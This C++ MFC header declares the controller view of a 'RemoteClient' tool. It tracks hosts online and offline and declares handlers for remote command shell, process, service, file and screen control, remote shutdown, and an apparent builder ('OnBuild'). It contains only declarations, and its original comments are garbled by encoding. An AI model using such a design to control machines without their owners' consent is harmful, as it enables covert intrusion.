// RemoteClientView.h : CRemoteClientView ��Ľӿ�
//


#pragma once
#include "RemoteClientDoc.h"
#include "SomeThing.h"
#include "ClientSock.h"
#include "Process.h"
#include "CmdShell.h"
#include "SvcManage.h"
#include "FileManage.h"
#include "ScreemManage.h"


#define IDC_STATUSBARCTRL  100000
#define WM_ONLINE (WM_USER+100)
#define WM_OFFLINE (WM_USER+101)

class CRemoteClientView : public CListView
{
protected: // �������л�����
	CRemoteClientView();
	DECLARE_DYNCREATE(CRemoteClientView)

// ����
public:
	CRemoteClientDoc* GetDocument() const;

// ����
public:


public:
	CStatusBarCtrl m_StatusBarCtrl;
	CImageList m_ImageList;
	CClientSock m_clientsock;
	CProcess *m_Process;
	CSomeThing m_some;
	void MyGetTime(void);


// ��д
public:
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
protected:
	virtual void OnInitialUpdate(); // ������һ�ε���

// ʵ��
public:
	virtual ~CRemoteClientView();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

protected:

// ���ɵ���Ϣӳ�亯��
protected:
	DECLARE_MESSAGE_MAP()


private:
	void MyInitWindow(void);
	
	
public:
	afx_msg void OnSize(UINT nType, int cx, int cy);
	LRESULT MyOnLine(WPARAM wp, LPARAM lp);
	LRESULT MyOffLine(WPARAM wp,LPARAM lp);
	afx_msg void OnNMRClick(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnCtrlExit();
	afx_msg void OnCtrlProcess();
	afx_msg void OnCtrlCmd();
	CCmdShell *m_CmdShell;
	afx_msg void OnLogout();
	afx_msg void OnRestart();
	afx_msg void OnShutdown();
	CSvcManage *m_SvcManage;
	afx_msg void OnCtrlSvcmanage();
	afx_msg void OnCtrlFile();
	CFileManage *m_FileManage;
	afx_msg void OnCtrlScreen();
	CScreemManage *m_ScreenManage;
	afx_msg void OnBuild();
	afx_msg void OnSetport();

	
};

#ifndef _DEBUG  // RemoteClientView.cpp �еĵ��԰汾
inline CRemoteClientDoc* CRemoteClientView::GetDocument() const
   { return reinterpret_cast<CRemoteClientDoc*>(m_pDocument); }
#endif

